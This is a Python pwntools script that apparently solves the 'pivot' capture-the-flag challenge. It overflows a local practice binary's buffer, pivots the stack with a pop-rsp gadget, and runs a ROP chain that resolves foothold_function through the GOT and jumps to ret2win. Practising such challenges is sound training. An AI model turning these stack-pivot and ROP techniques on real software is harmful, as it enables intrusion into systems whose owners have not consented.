from pwn import *
from struct import pack, unpack

ENDING = 5*b"\x00"

ret2winOffsetLib = 0xa81
foothold_functionOffsetLib = 0x96a
libfuncDiff = ret2winOffsetLib-foothold_functionOffsetLib

foothold_functionPLT = b"\x20\x07\x40" + ENDING
foothold_functionGOT = b"\x40\x10\x60" + ENDING

popGadget = b"\x2d\x0a\x40" + ENDING #pop rsp, pop r13, pop r14, pop r15
popRbpGadget = b"\xc8\x07\x40" + ENDING #pop rbp
movGadget = b"\xc0\x09\x40" + ENDING #mov rax, ptr qword [rax]
addGadget = b"\xc4\x09\x40" + ENDING #add rax, rbp
jmpGadget = b"\xc1\x07\x40" + ENDING #jmp rax
challenge = process("./pivot")

challenge.recvuntil(": ")
pivotChainStartAddress = pack("<Q", int(challenge.recvline()[:-1].decode('ascii'), 16)) #we recive the address as a bytes string, convert it to a regular string, convert it to an int, and then convert back to bytes
print("pivot block start address is:", pivotChainStartAddress)

initialRaxValue = 0x52 #just run and see the value of rax before the addition command that requires this value occurss (and hope that it doesnt change between runs)

stackSmashPayload = 40*b"A" + popGadget + pivotChainStartAddress 

payload = 3*8*b"\x00" #The padding here is because of the 3 pops in the pop gadget that are now taken from the pivoted rsp
payload += foothold_functionPLT #cause lazy loading to happen (now the functions address is in the got and we can read it from there
payload += popRbpGadget + pack("<q", unpack("<Q", foothold_functionGOT)[0] - initialRaxValue)
payload += addGadget + movGadget
payload += popRbpGadget + pack("<q", libfuncDiff)
payload += addGadget + jmpGadget

#pause()

challenge.sendafter(">", payload)
challenge.sendafter(">", stackSmashPayload) 

print(challenge.recvall())

